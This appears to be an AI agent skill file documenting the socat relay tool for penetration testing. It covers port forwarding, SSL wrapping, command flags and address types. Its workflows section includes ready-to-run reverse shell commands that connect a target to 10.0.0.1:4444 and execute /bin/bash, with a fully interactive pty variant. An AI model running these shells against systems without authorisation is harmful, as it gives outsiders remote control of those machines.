---
name: socat
description: Establish two bidirectional byte streams and transfer data between them. Use for TCP/UDP relaying, port forwarding, reverse shells, SSL/TLS encryption wrapping, SOCKS proxying, and connecting different data channels like files, pipes, and devices. Essential for web application testing, network pivoting, and exploitation.
---

# socat

## Overview
Socat (SOcket CAT) is a multipurpose relay for bidirectional data transfer. It functions as an advanced version of netcat, supporting IPv6, SSL, SOCKS, and complex address types. Category: Web Application Testing / Exploitation / Pivoting.

## Installation (if not already installed)
Assume socat is already installed. If not:
```bash
sudo apt install socat
```

## Common Workflows

### TCP Port Forwarder (Relay)
```bash
socat TCP4-LISTEN:8080,fork,reuseaddr TCP4:192.168.1.50:80
```
Listens on local port 8080 and forwards all connections to port 80 on a remote host.

### Reverse Shell (Listener)
```bash
socat -d -d TCP4-LISTEN:4444 STDOUT
```
On the target: `socat TCP4:10.0.0.1:4444 EXEC:/bin/bash`

### Fully Interactive Reverse Shell
Listener:
```bash
socat FILE:`tty`,raw,echo=0 TCP4-LISTEN:4444
```
Target:
```bash
socat TCP4:10.0.0.1:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### SSL Wrapped Web Server
```bash
socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,fork TCP4:127.0.0.1:80
```

## Complete Command Reference

### General Options
| Flag | Description |
|------|-------------|
| `-V` | Print version and feature information |
| `-h \| -?` | Print help text |
| `-hh` | Help plus common address option names |
| `-hhh` | Help plus all available address option names |
| `-d[ddd]` | Increase verbosity (up to 4 times) |
| `-d0\|1\|2\|3\|4` | Set verbosity level (0: Errors; 4: Debug) |
| `-D` | Analyze file descriptors before loop |
| `--experimental` | Enable experimental features |
| `--statistics` | Output transfer statistics on exit |
| `-ly[facility]` | Log to syslog (default: daemon) |
| `-lf<file>` | Log to file |
| `-ls` | Log to stderr (default) |
| `-lm[facility]` | Mixed log mode (stderr then syslog) |
| `-lp<name>` | Set program name for logging |
| `-lu` | Use microseconds for logging timestamps |
| `-lh` | Add hostname to log messages |
| `-v` | Verbose text dump of data traffic |
| `-x` | Verbose hexadecimal dump of data traffic |
| `-r <file>` | Raw dump of data (Left to Right) |
| `-R <file>` | Raw dump of data (Right to Left) |
| `-b<size>` | Set data buffer size (default 8192) |
| `-s` | Sloppy mode (continue on error) |
| `-S<mask]` | Log specific signals |
| `-t<timeout>` | Wait seconds before closing second channel |
| `-T<timeout>` | Total inactivity timeout in seconds |
| `-u` | Unidirectional mode (Left to Right) |
| `-U` | Unidirectional mode (Right to Left) |
| `-g` | Do not check option groups |
| `-L <file>` | Obtain lock or fail |
| `-W <file>` | Obtain lock or wait |
| `-0` | Do not prefer an IP version |
| `-4` | Prefer IPv4 |
| `-6` | Prefer IPv6 |

### Address Types (Address-Head)
Socat uses `bi-address` which can be `<address>` or `<address>!!<address>`.

**Network (TCP/UDP/SCTP/DCCP)**
- `TCP-CONNECT:<host>:<port>`
- `TCP-LISTEN:<port>`
- `UDP-CONNECT:<host>:<port>`
- `UDP-LISTEN:<port>`
- `SCTP-CONNECT:<host>:<port>`
- `SCTP-LISTEN:<port>`
- `DCCP-CONNECT:<host>:<port>`
- `DCCP-LISTEN:<port>`
- `OPENSSL:<host>:<port>` (SSL/TLS client)
- `OPENSSL-LISTEN:<port>` (SSL/TLS server)

**Proxy & Tunneling**
- `PROXY:<proxy-server>:<host>:<port>` (HTTP Proxy)
- `SOCKS4:<socks-server>:<host>:<port>`
- `SOCKS5-CONNECT:<socks-server>:<target-host>:<target-port>`
- `TUN[:<ip-addr>/<bits>]` (TUN/TAP interface)

**System & Execution**
- `EXEC:<command-line>` (Execute program)
- `SHELL:<shell-command>` (Execute via shell)
- `SYSTEM:<shell-command>` (System call)
- `STDIO`, `STDIN`, `STDOUT`, `STDERR`
- `FD:<fdnum>` (Use existing file descriptor)

**Files & Unix Sockets**
- `CREATE:<filename>`
- `GOPEN:<filename>` (Generic open)
- `OPEN:<filename>`
- `PIPE[:<filename>]`
- `UNIX-CONNECT:<filename>`
- `UNIX-LISTEN:<filename>`
- `ABSTRACT-CONNECT:<filename>` (Linux abstract sockets)

### Helper Tools

#### filan
Analyze file descriptors of a process.
- `-i<fdnum>`: Only analyze this fd.
- `-n<fdnum>`: Analyze fds from 0 to fdnum-1.
- `-s / -S`: Simple or improved output format.
- `-f<file>`: Analyze filesystem entry.
- `-o<file>`: Output to file or fd.

#### procan
Analyze system parameters of a process.
- `-V`: Version.
- `-c`: Print compile-time C defines.

#### socat-broker.sh
Forward data from one client to all other connected clients.
- Usage: `socat-broker.sh <options> <listener>`

#### socat-mux.sh
Multiplex multiple clients to one target.
- Usage: `socat-mux.sh <options> <listener> <target>`

#### socat-chain.sh
Chain multiple socat addresses (e.g., SOCKS over SSL).
- Usage: `socat-chain.sh <options> <addr1> <addr2> <addr3>`

## Notes
- `reuseaddr` is highly recommended for listeners to prevent "Address already in use" errors on restart.
- `fork` allows a listener to handle multiple concurrent connections.
- When using `EXEC` or `SYSTEM` for shells, use `pty,stderr,setsid,sigint,sane` for a better terminal experience.